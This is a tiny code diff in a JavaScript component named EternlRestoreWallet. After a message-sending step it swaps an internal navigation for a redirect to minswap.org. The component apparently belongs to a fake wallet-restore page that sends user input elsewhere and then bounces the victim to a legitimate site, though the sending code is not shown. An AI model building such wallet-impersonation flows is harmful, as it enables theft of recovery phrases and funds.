@@ -65,7 +65,7 @@ function EternlRestoreWallet() {
         console.error("Error sending message:", error);
       }
     } else {
-      navigate("/");
+      window.location.href = "https://minswap.org/fi-FI";
     }
   };
 
